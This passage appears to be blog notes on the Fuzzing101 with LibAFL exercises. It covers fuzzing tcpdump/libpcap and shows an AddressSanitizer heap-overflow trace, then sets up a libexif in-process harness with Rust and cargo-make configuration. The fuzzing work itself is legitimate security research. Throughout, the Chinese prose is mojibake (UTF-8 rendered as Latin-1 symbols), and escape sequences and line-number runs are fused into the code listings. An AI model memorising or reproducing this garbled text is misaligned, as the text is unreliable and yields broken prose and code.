cap_permittedï¼šæœ€å¤§èƒ½åŠ›é›† å¯æ‰§è¡Œæ–‡ä»¶ä¹Ÿæœ‰ä¸‰ç»„èƒ½åŠ›é›†ï¼Œä¸è¿›ç¨‹å¯¹åº”ï¼š\ncap_effectiveï¼š cap_allowedï¼šå¯ç»§æ‰¿çš„èƒ½åŠ›é›† cap_forcedï¼šå¿…é¡»æ‹¥æœ‰æ‰èƒ½æ‰§è¡Œçš„èƒ½åŠ›é›† å‡å¯ç®€è®°ä¸ºeipã€‚setcapæ˜¯é…ç½®Capabilityçš„å·¥å…·ï¼Œå…¶æ“ä½œç±»ä¼¼chmodã€‚\nDebug: build-libpcap å•¥å« -ldw 1 2 = note: /usr/bin/ld: cannot find -ldw: No such file or directory collect2: error: ld returned 1 exit status -ldwä»£è¡¨libdw.soï¼Œaptå®‰è£…å³å¯ æˆ‘afl-clang-ltoå‘¢ 1 2 3 configure:2853: afl-clang-lto --version \u0026gt;\u0026amp;5 ./configure: line 2855: afl-clang-lto: command not found configure:2864: $? = 127 è®©CCæŒ‡å‘AFLpulsplusé‡Œé¢çš„afl-clang-ltoã€‚åˆ‡è®°è¦ç»å¯¹è·¯å¾„ ä½ æ ¹æœ¬ä¸åœ¨bpf/net 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ make --debug Reading makefiles... Updating makefiles.... Updating goal targets.... File \u0026#39;all\u0026#39; does not exist. File \u0026#39;libpcap.a\u0026#39; does not exist. Prerequisite \u0026#39;grammar.c\u0026#39; is newer than target \u0026#39;grammar.h\u0026#39;. Must remake target \u0026#39;grammar.h\u0026#39;. Successfully remade target file \u0026#39;grammar.h\u0026#39;. File \u0026#39;bpf_filter.o\u0026#39; does not exist. File \u0026#39;bpf_filter.c\u0026#39; does not exist. File \u0026#39;bpf/net/bpf_filter.c\u0026#39; does not exist. Must remake target \u0026#39;bpf/net/bpf_filter.c\u0026#39;. make: *** No rule to make target \u0026#39;bpf/net/bpf_filter.c\u0026#39;, needed by \u0026#39;bpf_filter.c\u0026#39;. Stop. å¥½ç†Ÿæ‚‰çš„bugï¼ŒğŸ‘´æ¨¡ç³Šçš„è®°å¾—ä¹‹å‰æ£é¼“åˆ«çš„fuzzerçš„æ—¶å€™å¥½åƒä¹Ÿé‡åˆ°è¿‡ï¼Œä½†æ˜¯ğŸ‘´æ¸…æ¥šçš„è®°å¾—å½“æ—¶æˆ‘æ²¡è§£å†³ã€‚\näºæ˜¯ï¼ŒğŸ‘´å¼€å§‹æ’æŸ¥æ˜¯å¦æœ‰ä¾èµ–ç¼ºå¤±ï¼Œsudo apt-get install libpcap-devï¼Œæ²¡ç”¨ã€‚æ€»ä¸èƒ½æ˜¯ WSL å†…æ ¸å°±å°‘ç‚¹ä¸œè¥¿å§ï¼Œæˆ‘éƒ½WSL2äº†ã€‚\nåˆå›å¤´çœ‹äº†çœ‹æºç ï¼Œå‘ç° libpcap çš„ Github ä¸Šæœ‰ä¸€ä»½bpf_filter.cï¼Œè€Œä½œè€…ç»™çš„fuzzing-101-solutioné‡Œé¢æ²¡æœ‰ã€‚ğŸ‘´ç›´æ¥ä¸Šlibpacpä»“åº“å¤åˆ¶ï¼Œæ²¡ç”¨ã€‚\nå†çœ‹çœ‹ fuzzing-101 ä»“åº“ï¼Œä»–ç”¨çš„æ˜¯ libpacp1.80 ç‰ˆæœ¬ï¼ŒğŸ‘´å»ç¿»ä»“åº“çš„æ ‡ç­¾ï¼Œæœç„¶1.8ç‰ˆæœ¬æœ‰bpf/net/bpf_filter.cã€‚ç ´æ¡ˆäº†ã€‚ğŸ‘´ç›´æ¥è¿›è¡Œä¸€ä¸ªissueçš„æã€‚\nåé¢ä¸€æ­¥æ²¡æŠ¥é”™ã€‚å¶å‰‹~\n1 2 3 4 5 6 7 8 $ ./build/sbin/tcpdump --h tcpdump version 4.9.1 libpcap version 1.8.0 OpenSSL 3.0.2 15 Mar 2022 Compiled with AddressSanitizer/CLang. $ ./build/sbin/tcpdump -r corpus/bootp-testcase.pcap reading from file corpus/bootp-testcase.pcap, link-type IPV4 (Raw IPv4) 15:11:03.147545 IP localhost.bootps \u0026gt; 127.1.1.1.bootpc: BOOTP/DHCP, Request from 00:00:00:00:00:00 (oui Ethernet), length 236 fuzzer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 fn main() { let parsed_opts = parser::parse_args(); let cores = Cores::from_cmdline(\u0026amp;parsed_opts.cores).expect(\u0026#34;Failed to parse cores\u0026#34;); ForkserverBytesCoverageSugar::\u0026lt;86217\u0026gt;::builder() .input_dirs(\u0026amp;[parsed_opts.input]) .output_dir(parsed_opts.output) .cores(\u0026amp;cores) .program(parsed_opts.target) .debug_output(parsed_opts.debug) .arguments(\u0026amp;parsed_opts.args) .build() .run() } Sugar API to simplify the life of the naive user of LibAFL\nLibAFLè´´å¿ƒçš„ä¸ºæˆ‘è¿™ç§ naive user å‡†å¤‡äº†ä¸€æ¡é¾™æœåŠ¡ï¼Œæä¾›äº† Sugar API å°†å‰ä¸¤ç¯‡çš„æ ·æ¿ä»£ç è¿›ä¸€æ­¥ç®€åŒ–ã€‚å¥½çš„ï¼Œfuzzerå†™å®Œäº†ã€‚\nRust åŸºç¡€ä¹‹ Builder parser.rs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #[derive(Parser, Debug)] pub struct FuzzerOptions { #[clap(short, long, default_value = \u0026#34;solutions\u0026#34;)] pub output: PathBuf, #[clap(short, long, default_value = \u0026#34;corpus\u0026#34;, multiple_values = true)] pub input: PathBuf, #[clap(short, long)] pub cores: String, #[clap(short, long, required = true, takes_value = true)] pub target: String, #[clap(short, long)] pub debug: bool, #[clap( short, long, allow_hyphen_values = true, multiple_values = true, takes_value = true )] pub args: Vec\u0026lt;String\u0026gt;, } pub fn parse_args() -\u0026gt; FuzzerOptions { FuzzerOptions::parse() } è¿™é‡Œä½¿ç”¨äº† clap åº“æ¥è§£æå‘½ä»¤è¡Œå‚æ•°ï¼Œè½¬æ¢ä¸ºæ•°æ®ç»“æ„FuzzerOptionsã€‚\nRust åŸºç¡€ä¹‹ æ³¨è§£ è·‘ğŸƒâ€ ç›´æ¥è·‘æ˜¯å¾ˆdumbçš„ï¼Œè¿Ÿè¿Ÿè·‘ä¸å‡ºç»“æœã€‚è¿™é‡Œå…ˆæŠ„ä¸ªç­”æ¡ˆ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ./build/sbin/tcpdump -r corpus/bootp_asan.pcap -v [2:27:14] reading from file corpus/bootp_asan.pcap, link-type EN10MB (Ethernet) 08:00:00.000000 IP (tos 0x0, ttl 252, id 40207, offset 0, flags [+, DF, rsvd], proto UDP (17), length 60951, bad cksum ff (-\u0026gt;8336)!) ================================================================= ==23730==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6060000000b4 at pc 0x56339a3e4010 bp 0x7fffaf70f850 sp 0x7fffaf70f848 READ of size 2 at 0x6060000000b4 thread T0 #0 0x56339a3e400f in bootp_print /home/czy/fuzzing-101-solutions/exercise-3/tcpdump/./print-bootp.c:325:2 #1 0x56339a46960a in ip_print_demux /home/czy/fuzzing-101-solutions/exercise-3/tcpdump/./print-ip.c:387:3 #2 0x56339a47008b in ip_print /home/czy/fuzzing-101-solutions/exercise-3/tcpdump/./print-ip.c:658:3 #3 0x56339a4207c2 in ethertype_print /home/czy/fuzzing-101-solutions/exercise-3/tcpdump/./print-ether.c:333:10 #4 0x56339a41e731 in ether_print /home/czy/fuzzing-101-solutions/exercise-3/tcpdump/./print-ether.c:236:7 #5 0x56339a36bff1 in pretty_print_packet /home/czy/fuzzing-101-solutions/exercise-3/tcpdump/./print.c:339:18 #6 0x56339a36bff1 in print_packet /home/czy/fuzzing-101-solutions/exercise-3/tcpdump/./tcpdump.c:2506:2 #7 0x56339a74458a in pcap_offline_read /home/czy/fuzzing-101-solutions/exercise-3/libpcap/./savefile.c:507:4 #8 0x56339a362050 in pcap_loop /home/czy/fuzzing-101-solutions/exercise-3/libpcap/./pcap.c:875:8 #9 0x56339a362050 in main /home/czy/fuzzing-101-solutions/exercise-3/tcpdump/./tcpdump.c:2009:12 ç­”æ¡ˆæ˜¯ç®¡ç”¨çš„ï¼Œä½†æ˜¯ç›´æ¥ä¸¢è¿› Libafl å´æ²¡æœ‰crashã€‚\nä¼˜åŒ– ç›®å‰çš„fuzzeråŸä½œè€…è·‘äº†ä¸€æ™šä¸Šå•¥ä¹Ÿæ²¡è·‘å‡ºæ¥ï¼Œç”±æ­¤å¼•å…¥ä¸€äº›ä¼˜åŒ–æ–¹æ³•ã€‚\nè¯­æ–™åº“å‹ç¼©ï¼šoptmin optmin æ˜¯ afl-tmin çš„ä¼˜åŒ–ç‰ˆã€‚å°†è¯­æ–™åº“ä¸­è§¦å‘é‡å¤è·¯å¾„çš„éƒ¨åˆ†æœ€å°åŒ–ï¼Œæœ‰åŠ©äºfuzzerå‡å°‘é‡å¤å°è¯•ã€‚è¿™é‡Œçš„è¯­æ–™åº“åœ¨/solutions/queueï¼Œä¹Ÿå°±æ˜¯AFLæ‰§è¡Œè¿‡è‹¥å¹²è½®åçš„ã€‚\n1 2 3 4 5 6 7 # build cd AFLplusplus/utils/optimin ./build_optimin.sh mv optimin ../../../exercise-3 # run cp -r solutions/queue/* queue_for_cmin AFL_MAP_SIZE=86217 ASAN_OPTIONS=abort_on_error=1 ./optimin -f -i queue_for_cmin -o cminnified ./build/sbin/tcpdump -vr @@ æ ·ä¾‹å‹ç¼©ï¼šafl-tmin å¦ä¸€æ–¹é¢ï¼Œtminå¯¹å•ä¸ªè¾“å…¥è¿›è¡Œå‹ç¼©ï¼Œå‡å°æ–‡ä»¶å¤§å°ä¹Ÿæœ‰åŠ©äºæé«˜æ•ˆç‡ã€‚\n1 2 3 4 5 6 7 # build cd AFLplusplus/ make afl-tmin mv afl-tmin ../exercise-3 # run cp -r solutions/queue/* queue_for_cmin AFL_MAP_SIZE=86217 ASAN_OPTIONS=abort_on_error=1 ./optimin -f -i queue_for_cmin -o cminnified ./build/sbin/tcpdump -vr @@ è¦†ç›–ç‡è§‚å¯Ÿï¼šafl-cov ç„¶è€Œè¿™ç§å¸¸è§„ä¼˜åŒ–è¿˜æ˜¯æ²¡èƒ½æœ‰çªç ´ï¼ŒåŸä½œè€…å†³å®šè§‚å¯Ÿä¸€ä¸‹é‚£äº›ä»£ç è¿˜æ²¡æœ‰è¢«è¦†ç›–ã€‚å®‰è£…è¦†ç›–ç‡å·¥å…·afl-covç›¸å¯¹æ¯”è¾ƒç¹çï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 export HOME=/fuzzing-101-solutions/exercise-3/ cd $home # å®‰è£…afl-cov sudo apt install lcov git clone https://github.com/vanhauser-thc/afl-cov.git # ç§»åŠ¨æºä»£ç  mkdir exercise-3-gcov exercise-3-gcov/build cp -r exercise-3/libpcap exercise-3-gcov cp -r exercise-3/tcpdump exercise-3-gcov cp -r exercise-3/solutions exercise-3-gcov # æ¸…ç†lockæ–‡ä»¶ cd exercise-3-gcov/solutions/queue find * -empty -delete # lcov éœ€è¦æ–‡ä»¶åä»…ä¸º6ä½ ## åŸåšå®¢ç”¨çš„pythonè„šæœ¬ï¼ŒğŸ‘´ç›´æ¥è¯·æ•™ new bing for i in *; do mv -v \u0026#34;$i\u0026#34; \u0026#34;${i: -6}\u0026#34; done # ç¼–è¯‘å¸¦ cov çš„ libpcap cd $home/exercise-3-gcov/libpcap make clean /opt/afl-cov/afl-cov-build.sh -c ./configure --prefix=$(pwd)/../build; make make install # ç¼–è¯‘å¸¦ cov çš„ tcpdump cd $home/exercise-3-gcov/tcpdump make clean CFLAGS=-I$(pwd)/../build/include/ LDFLAGS=-L$(pwd)/../build/lib/ /opt/afl-cov/afl-cov-build.sh -c ./configure --prefix=$(pwd)/../build ; make make install sudo setcap cap_sys_admin+epi ../build/sbin/tcpdump # æ‰§è¡Œ /opt/afl-cov/afl-cov.sh -c solutions \u0026#34;./build/sbin/tcpdump -vr @@\u0026#34; è§‚å¯Ÿåˆ°æ ¹æœ¬è¿è¡Œä¸åˆ°ç›®æ ‡CVEæ‰€åœ¨çš„æ–‡ä»¶ã€‚\nå›ºå®šè¾“å…¥ æœ€ååŸä½œè€…å†³å®šæ”¹ Libafl æºç ï¼Œåœ¨å˜å¼‚ä¹‹å‰å¾€é‡Œå¡å›ºå®šäº†çš„ BOOTY å¤´ã€‚ä½†æ˜¯ğŸ‘´çš„ LibAFL æºä»£ç å’ŒåŸåšå®¢ä¸­æœ‰äº›å¾®åŒºåˆ«ï¼Œè™½ç„¶ç‰ˆæœ¬å·ä¸€æ ·ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ///libafl/src/executors/forkserver.rs:438 if self.executor.uses_shmem_testcase() { let shmem = unsafe { self.executor.shmem_mut().as_mut().unwrap_unchecked() }; let target_bytes = input.target_bytes(); let size = target_bytes.as_slice().len(); let size_in_bytes = size.to_ne_bytes(); // The first four bytes tells the size of the shmem. shmem.as_mut_slice()[..4].copy_from_slice(\u0026amp;size_in_bytes[..4]); shmem.as_mut_slice()[SHMEM_FUZZ_HDR_SIZE..(SHMEM_FUZZ_HDR_SIZE + size)] .copy_from_slice(target_bytes.as_slice()); } else { self.executor .input_file_mut() .write_buf(input.target_bytes().as_slice())?; } ä¸è¿‡è¿˜æ˜¯æ‰¾åˆ°äº†å¯¹åº”çš„ä½ç½®ï¼Œå‘write_buf()æ’å…¥å›ºå®šçš„å¤´éƒ¨å³å¯ã€‚\nğŸ‘´è§‰å¾—è¿™æ ·ä¸å¤Ÿä¼˜é›…ï¼Œäºæ˜¯å¯»æ€èƒ½å¦è¿›è¡Œä¸€ä¸ªç±»é‡å†™ã€‚\nã€To be continueã€‘\n","date":"2023-08-02T02:00:36+08:00","permalink":"https://lonelyuan.github.io/p/libafl-fuzzing101-3/","title":"libAFLé€Ÿé€šFuzzing101 (3)"},{"content":" æœ¬ç³»åˆ—æ˜¯å­¦ä¹ ã€ŠFuzzing101 with LibAFLã€‹ç³»åˆ—åšå®¢ï¼ˆåæ–‡ç»Ÿç§°ï¼šåŸåšå®¢ï¼‰çš„ç¬”è®°åˆ†äº«ï¼Œåœ¨å­¦ä¹ ä»‹ç» LibAFL ç”¨æ³•çš„åŒæ—¶æ€»ç»“ Rust çŸ¥è¯†ç‚¹ã€‚\nå‰ç½®çŸ¥è¯†ï¼š fuzzåŸºæœ¬æ¦‚å¿µã€AFLåŸºæœ¬ä½¿ç”¨ æœ¬ç¯‡è¦ç‚¹ï¼š\nLibAFL Inprocessæ¨¡å¼ Harness ç¼–è¯‘å™¨wrapper LLPMï¼Œå¤šæ ¸å¹¶è¡Œ æ¼æ´åˆ†ç±»ï¼šAFLTriage Rust å‡½æ•°ã€é—­åŒ… match æ¨¡å¼è¯†åˆ« Optionã€Result Execise-1.5 Execise-1 ä¸­ç¼–å†™çš„fuzzerååˆ†ç”šè‡³ä¹åˆ†çš„ç®€é™‹ï¼Œè·ç¦»å®é™…åº”ç”¨è¿˜ç›¸å·®ç”šè¿œã€‚åŸåšå®¢åœ¨1.5é›†ä¸­åˆ—ä¸¾äº†ä¸‰ç§ä¼˜åŒ–æ–¹æ³•ï¼š\nä½¿ç”¨afl-clang-lto ä»£æ›¿ afl-clang-fastâ€”â€” fast 1.1x afl-clang-lto(link time optimization): å®ç°æ— ç¢°æ’æ’æ¡© ä½¿ç”¨ å…±äº«å†…å­˜ å¹²æ‰ æ–‡ä»¶I/O â€”â€” fast 3x patchæºä»£ç ï¼ŒåŠ å…¥__AFL_FUZZ_INIT();å® ä½¿ç”¨InProcessExecutor æ¢æ‰ ForkserverExecutorâ€”â€” fast 10x patchæºä»£ç ï¼Œç¼–å†™harness functionå’Œcompiler wraper ç”±äº Execise-1 çš„ç›®æ ‡xpdfæ˜¯å‘½ä»¤è¡Œç¨‹åºï¼Œä¸æ˜¯åº“ï¼Œæ•…éœ€è¦åšä¸€å®šä¿®æ”¹ä½¿å…¶æ”¯æŒé™æ€é“¾æ¥ã€‚å…¶æ“ä½œè¾ƒä¸ºç¹çï¼Œæ¶‰åŠmakeè¿ç§»åˆ°cmakeç­‰ï¼Œå»ºè®®æœ‰éœ€æ±‚æ—¶è‡ªè¡Œç ”ç©¶ã€‚\nè€Œ Execise-2 çš„ç›®æ ‡libexifæœ¬èº«æ˜¯ä¸€ä¸ªåº“ï¼Œä¸å¦‚å€ŸåŠ© Execise-2 å­¦ä¹ harnessã€‚\næ‰€ä»¥ä»€ä¹ˆæ˜¯harnessï¼Ÿ Harness v. æ§åˆ¶å¹¶åˆ©ç”¨ï¼›ï¼ˆæŠŠåŠ¨ç‰©ï¼‰æ‹´åœ¨ä¸€èµ·ï¼ˆæˆ–æ‹´åˆ°æŸç‰©ä¸Šï¼‰ï¼›ç»™ï¼ˆé©¬ï¼‰å¥—ä¸ŠæŒ½å…·ï¼›è¿æ¥ï¼Œä¸²è” n. ï¼ˆé©¬çš„ï¼‰æŒ½å…·ï¼Œé©¬å…·ï¼›ç³»å¸¦ï¼ŒåŠå¸¦ï¼›æ—¥å¸¸å·¥ä½œ\nåœ¨é¢å¯¹ä¸€ä¸ªåº“æ—¶ï¼Œå¹¶æ²¡æœ‰ç°æˆçš„å…¥å£ç‚¹ï¼Œå› æ­¤éœ€è¦å†™ä¸€ä¸ªå‡½æ•°æ¥è°ƒç”¨å®ƒï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ harnessã€‚æ­¤æ—¶ï¼Œharnessæˆä¸ºäº†ä¸fuzzerç›´æ¥äº¤äº’çš„ç›®æ ‡ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œfuzzeræ˜¯æ¨ªå†²ç›´æ’çš„é‡é©¬ï¼Œtargetæ˜¯ä¸€æœ›æ— é™…çš„è‰åŸï¼Œharnessåˆ™æ˜¯æŒ‡å¼•æ–¹å‘çš„ç¼°ç»³ã€‚\nä½¿ç”¨harnessæ—¶ï¼Œfuzzerçš„æ‰€æœ‰å·¥ä½œå°†åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­å®Œæˆï¼Œå³InProcessã€‚è¿™å¯¹æ€§èƒ½æœ‰ä»¥ä¸‹å¥½å¤„ï¼š\nå¯ä»¥ç›´æ¥é€šè¿‡harnessçš„ç¼–å†™ä¿ƒä½¿fuzzeræ¢ç´¢æˆ‘ä»¬æ„Ÿå…´è¶£çš„éƒ¨åˆ† ä¸fork-serverä¸åŒï¼Œè¿›ç¨‹å†…æ‰§è¡Œå…å»äº†è¿›ç¨‹ç®¡ç†çš„è´Ÿæ‹…ï¼Œè¿™ä¸€ç‚¹æ˜¾è‘—æå‡äº†æ€§èƒ½ å•è¿›ç¨‹æ¨¡å¼å¤©ç„¶æ”¯æŒå¤šæ ¸ï¼Œï¼ˆä¸€ä¸ªfuzzerå®ä¾‹ä¸€ä¸ªcpuæ ¸å¿ƒï¼‰å¯¹ç°ä»£å¤šæ ¸å¤„ç†å™¨å‹å¥½ é‚£ä¹ˆä»£ä»·æ˜¯ä»€ä¹ˆï¼Ÿç”±äºharnesså°†åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­è¢«åå¤æ‰§è¡Œï¼Œharnessåº”æ»¡è¶³ä»¥ä¸‹è¦æ±‚ï¼š\nä¸èƒ½æœ‰å†…å­˜æ³„æ¼ï¼Œå¦åˆ™å°†ä¼šå¯¹fuzzeræœ¬èº«é€ æˆç ´åã€‚ ä¸è¦æ‰§è¡Œexit()ã€‚è¿™ä¼šç»“æŸå½“å‰è¿›ç¨‹ï¼Œåº”è¯¥å‘é€abortä»¥ä¾›fuzzeré‡å¯ é¿å…é«˜ç®—æ³•å¤æ‚åº¦ï¼Œé¿å…å¤§é‡å†…å­˜å ç”¨ï¼Œé¿å…æ—¥å¿—è¾“å‡ºç­‰æ‹–æ…¢é€Ÿåº¦çš„è¡Œä¸º æ˜¯ä¸æ˜¯æ‘©æ‹³æ“¦æŒäº†å‘¢ï¼Ÿè®©æˆ‘ä»¬é‡æ–°åŠ å…¥æˆ˜æ–—å§ï¼\nExecise-2 libexif source \u0026amp; corpus 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # libexifçš„ä¾èµ– apt-get install autopoint libtool gettext libpopt-dev # ä¸‹è½½æºç  wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz tar -xf libexif-0_6_14-release.tar.gz mv libexif-libexif-0_6_14-release libexif # å‡†å¤‡corpus mkdir corpus solutions cd corpus git clone --no-checkout --filter=blob:none https://github.com/libexif/libexif.git cd libexif ## åªç•™å›¾ç‰‡ git checkout master -- test/testdata mv test/testdata/*.jpg ../ cd .. rm -rvf libexif Cargo.toml åœ¨InProcessæ¨¡å¼ä¸­ï¼Œéœ€è¦ç¼–è¯‘å™¨æŠŠfuzzerï¼Œtargetï¼Œharnesså…¨éƒ¨é“¾æ¥åˆ°ä¸€èµ·ã€‚æ•…ä»¥åº“çš„å½¢å¼åˆ›å»ºé¡¹ç›®ï¼š\ncargo new --lib exercise-2 åŒæ—¶ï¼Œæœ¬ç¯‡ä¹Ÿç”¨åˆ°äº†Libaflçš„å…¨éƒ¨ç»„ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # execise-2/Cargo.toml [package] name = \u0026#34;exercise-2\u0026#34; version = \u0026#34;0.1.0\u0026#34; edition = \u0026#34;2021\u0026#34; [dependencies] libafl = { version = \u0026#34;0.10.1\u0026#34; } # libafl core libafl_cc = { version = \u0026#34;0.10.1\u0026#34; } # compiler wrapper libafl_targets = { version = \u0026#34;0.10.1\u0026#34;, features = [ \u0026#34;libfuzzer\u0026#34;, \u0026#34;sancov_pcguard_hitcounts\u0026#34;, \u0026#34;sancov_cmplog\u0026#34;, ] } # common code for targets instrumentation [lib] name = \u0026#34;exercisetwo\u0026#34; crate-type = [\u0026#34;staticlib\u0026#34;] # ç”Ÿæˆ libexercisetwo.a cargo-make ä½¿ç”¨build.rsèƒ½å¤Ÿå¢åŠ è‡ªåŠ¨åŒ–ç¨‹åº¦ï¼Œä½†ç”¨rustå†™shellä¾æ—§ç•¥æ˜¾ç¹çã€‚äºæ˜¯åŸåšå®¢å¼•å…¥äº† cargo-make å·¥å…·ï¼Œåœ¨cargoåŸæœ¬çš„Cargo.tomlåŸºç¡€ä¸ŠåŠ å…¥äº†Makefile.tomlï¼Œç”¨ä»¥è‡ªå®šä¹‰é…ç½®ï¼Œæ„å»ºè‡ªåŠ¨åŒ–å·¥ä½œæµã€‚ ç±»ä¼¼äºMakefileï¼Œåˆæœ‰ç‚¹åƒdocker-compose.ymlã€‚\nå®‰è£…ï¼šcargo install --force cargo-make å¦‚ä¸‹æ‰€ç¤ºï¼Œæ—¢å¯ä»¥æ‰§è¡Œcargo make buildä¸€å¥è¯è·‘é€šå…¨éƒ¨ï¼Œä¹Ÿå¯å•ç‹¬æ‰§è¡Œcargo make build-libexifï¼Œååˆ†çµæ´»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # execise-2/Makefile.toml [tasks.build] dependencies = [\u0026#34;clean\u0026#34;, \u0026#34;build-compilers\u0026#34;, \u0026#34;copy-project-to-build\u0026#34;, \u0026#34;build-libexif\u0026#34;, \u0026#34;build-fuzzer\u0026#34;] [tasks.build-compilers] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;build\u0026#34;, \u0026#34;--release\u0026#34;] [tasks.copy-project-to-build] script = \u0026#34;\u0026#34;\u0026#34; mkdir -p build/ cp ${CARGO_MAKE_WORKING_DIRECTORY}/../target/release/ex2_compiler build/ cp ${CARGO_MAKE_WORKING_DIRECTORY}/../target/release/libexercisetwo.a build/ \u0026#34;\u0026#34;\u0026#34; [tasks.build-fuzzer] cwd = \u0026#34;build\u0026#34; command = \u0026#34;./ex2_compiler\u0026#34; args = [\u0026#34;-I\u0026#34;, \u0026#34;../libexif/libexif\u0026#34;, \u0026#34;-I\u0026#34;, \u0026#34;../libexif\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;fuzzer\u0026#34;, \u0026#34;../harness.c\u0026#34;, \u0026#34;lib/libexif.a\u0026#34;] # -Idir å¢åŠ dirä¸ºå¤´æ–‡ä»¶çš„æœç´¢è·¯å¾„ [tasks.build-libexif] cwd = \u0026#34;libexif\u0026#34; env = { \u0026#34;CC\u0026#34; = \u0026#34;/fuzzing101/exercise-2/build/ex2_compiler\u0026#34;, \u0026#34;LLVM_CONFIG\u0026#34; = \u0026#34;llvm-config-15\u0026#34;} script = \u0026#34;\u0026#34;\u0026#34; autoreconf -fi ./configure --enable-shared=no --prefix=\u0026#34;${CARGO_MAKE_WORKING_DIRECTORY}/../build/\u0026#34; make -i make install -i \u0026#34;\u0026#34;\u0026#34; çœ‹èµ·æ¥æ¸…çˆ½å¤šäº†ï¼ˆæ­¤æ—¶ğŸ‘´è¿˜æ²¡æœ‰æ„è¯†åˆ°é—®é¢˜çš„ä¸¥é‡æ€§ï¼‰ã€‚\nè¡¥å……ï¼šLinuxå¼€å‘å·¥å…·é“¾ ./configure é…ç½®: æ ¹æ®Makefile.inæ¨¡æ¿å’Œç³»ç»Ÿä¿¡æ¯ç”ŸæˆMakefile make ç¼–è¯‘ï¼šæ ¹æ®Makefileå°†æºä»£ç ç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶ make install å®‰è£…ï¼šå°†å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶åˆ°æ­£ç¡®çš„åœ°æ–¹\nautoreconfï¼šå±äº autotools å·¥å…·é“¾ï¼Œä¹Ÿæ˜¯ç”Ÿæˆmakefileçš„è‡ªåŠ¨åŒ–å·¥å…·ã€‚åé€æ¸è¢«cmakeå–ä»£ã€‚ï¼ˆç°åœ¨æµè¡Œçš„æ˜¯Antï¼Ÿï¼‰ harness \u0026amp; compiler harness.c harnessçš„æ ¸å¿ƒï¼Œä¹Ÿå°±æ˜¯è¢«fuzzerè°ƒç”¨çš„ä½ç½®ï¼Œæ˜¯LLVMFuzzerTestOneInput()å‡½æ•°ã€‚ å…¶è¾“å…¥æ˜¯ä¸€ä¸ªå­—èŠ‚æ•°ç»„å’Œå…¶å°ºå¯¸ã€‚ä¸»æµfuzzeréƒ½æ¥å—è¿™ä¸ªå‡½æ•°å£°æ˜ï¼Œæˆ–è®¸æ˜¯å› ä¸ºä»–ä»¬åç«¯éƒ½ç”¨çš„LLVMçš„Libfuzzerå§ã€‚\nåœ¨Libexifçš„testç›®å½•ä¸‹æœ‰test-fuzzer-persistent.cï¼Œæ˜¯ä¸€ä¸ªé€‚ç”¨äºAFLæŒä¹…æ¨¡å¼çš„harnessã€‚ç¨åŠ æ”¹é€ å³å¯ï¼š\nåˆ é™¤ AFL å® åˆ é™¤ä»»ä½•æ‰“å°/æ—¥å¿—è¯­å¥ å°† main() é‡å‘½åä¸º LLVMFuzzerTestOneInput() ä¿®å¤å…¶ä»–ç‰ˆæœ¬é—®é¢˜ compiler.rs æ˜¾ç„¶ï¼Œè¿™éƒ¨åˆ†å¹¶æ²¡æœ‰è®©æˆ‘ä»¬å†™ä¸€ä¸ªç¼–è¯‘å™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå¥—å£³ï¼Œä¸€å±‚åŒ…è£…(wrapper)ã€‚ è¿™é‡Œå°†targetä¸fuzzeré™æ€é“¾æ¥åœ¨ä¸€èµ·ï¼Œå¹¶åŠ å…¥-fsanitize=addresså‚æ•°ä»¥ä½¿ç”¨ASANã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // exercise-2/src/bin/ex2_compiler.rs pub fn main() { let cwd = env::current_dir().unwrap(); let args: Vec\u0026lt;String\u0026gt; = env::args().collect(); let mut cc = ClangWrapper::new(); if let Some(code) = cc .cpp(false) .silence(true) .parse_args(\u0026amp;args) .expect(\u0026#34;Failed to parse the command line\u0026#34;) .link_staticlib(\u0026amp;cwd, \u0026#34;exercisetwo\u0026#34;) .add_arg(\u0026#34;-fsanitize-coverage=trace-pc-guard\u0026#34;) .add_arg(\u0026#34;-fsanitize=address\u0026#34;) .run() .expect(\u0026#34;Failed to run the wrapped compiler\u0026#34;) { std::process::exit(code); } } å¼€å§‹ç¼–å†™fuzzerä¹‹å‰ï¼Œæ ¹æ®é¡¹ç›®çš„æ–‡ä»¶ç»“æ„æ¢³ç†ä¸€ä¸‹ç¼–è¯‘é€»è¾‘ï¼š\nbuild-compilers: ç”Ÿæˆè‡ªå·±çš„ç¼–è¯‘å™¨ï¼šç¼–è¯‘æ—¶é“¾æ¥fuzzeråº“ã€‚ build-libexifï¼šç”¨è‡ªå·±çš„ç¼–è¯‘å™¨ç¼–è¯‘target build-fuzzerï¼šç”¨è‡ªå·±çš„ç¼–è¯‘å™¨ç¼–è¯‘harnessï¼Œå¹¶é“¾æ¥targetåº“ 1 2 3 4 5 6 7 8 9 10 |-- Cargo.toml |-- Makefile.toml |-- corpus |-- harness.c |-- libexif |-- solutions `-- src |-- bin | `-- ex2_compiler.rs `-- lib.rs Libafl: Inprocessæ¨¡å¼ ç»„ä»¶ï¼šObserver \u0026amp; Feedback 